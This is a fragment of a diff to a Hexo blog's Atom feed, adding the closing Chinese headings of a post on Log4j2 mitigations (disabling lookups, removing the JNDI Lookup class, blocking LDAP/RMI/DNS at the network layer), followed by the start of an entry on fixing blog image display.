+&lt;h2 id=&#34;2-修改-log4j2-配置文件在日志格式中禁用-lookup&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-修改-log4j2-配置文件在日志格式中禁用-lookup&#34;&gt;#&lt;/a&gt; 2、修改 Log4j2 配置文件，在日志格式中禁用 Lookup&lt;/h2&gt;
+&lt;h2 id=&#34;3-删除-jndi-lookup-类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-删除-jndi-lookup-类&#34;&gt;#&lt;/a&gt; 3、删除 JNDI Lookup 类&lt;/h2&gt;
+&lt;h2 id=&#34;4-网络层阻断对一些服务进行拦截阻断如ldaprmidns等做好白名单校验&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-网络层阻断对一些服务进行拦截阻断如ldaprmidns等做好白名单校验&#34;&gt;#&lt;/a&gt; 4、网络层阻断，对一些服务进行拦截阻断，如(LDAP\RMI\DNS)等，做好白名单校验&lt;/h2&gt;
+</content>
+        <category term="Java安全" />
+        <updated>2026-04-01T13:59:12.000Z</updated>
+    </entry>
     <entry>
         <id>https://lib0gus.github.io/2026/04/01/%E8%A7%A3%E5%86%B3hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</id>
         <title>解决hexo博客图片显示问题</title>
